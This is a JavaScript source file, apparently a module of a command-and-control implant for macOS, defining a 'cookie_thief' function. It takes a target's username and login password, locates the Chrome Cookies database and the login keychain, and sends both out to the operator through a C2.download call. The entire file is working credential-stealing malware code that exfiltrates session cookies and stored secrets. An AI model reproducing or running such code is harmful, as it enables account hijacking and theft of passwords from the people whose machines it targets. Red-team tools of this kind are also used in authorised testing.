exports.cookie_thief = function(task, command, params){
    let config = JSON.parse(params);
    let keyDL_status = {};
    let cookieDL_status = {};
    let password = "";
    var username = "";
    let browser = "chrome";
    let homedir = "/Users/";
    let keychainpath = "/Library/Keychains/login.keychain-db";
    let chromeCookieDir = "/Library/Application Support/Google/Chrome/Default/Cookies";
    let cookiedir = "/Library/Application Support/Google/Chrome/Default/Cookies";

    if(config.hasOwnProperty("password") && typeof config['password'] == 'string'){
        password = config['password'];
    }
    else {
      return {'user_output': "Must supply the user's login password", "completed": true, "status": "error"};
    }

    if(config.hasOwnProperty("username") && typeof config['username'] == 'string' && config['username']) {
        username = config['username'];
    }
    else {
        return {'user_output': "Must supply the username", "completed": true, "status": "error"};
    }
    let cookiepath = homedir + username;

    if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){
      browser = config['browser'];
    }

    if(browser === "chrome") {
        cookiedir = chromeCookieDir;
    }
    let cookieDLPath = cookiepath + cookiedir;

    try{
        cookieDL_status = C2.download(task, cookieDLPath);
    }
    catch(error)  {
        return {'user_output': error.toString(), "completed": true, "status": "error"};
    }

    let keypath = homedir + username + keychainpath;
    try{
        keyDL_status = C2.download(task, keypath);
    	  if(keyDL_status.hasOwnProperty("file_id")){
    	      keyDL_status['user_output'] = "\nFinished Downloading KeychainDB and Cookies\n";
        }
    }
    catch(error)  {
        return {'user_output': error.toString(), "completed": true, "status": "error"};
    }
    return keyDL_status;
};
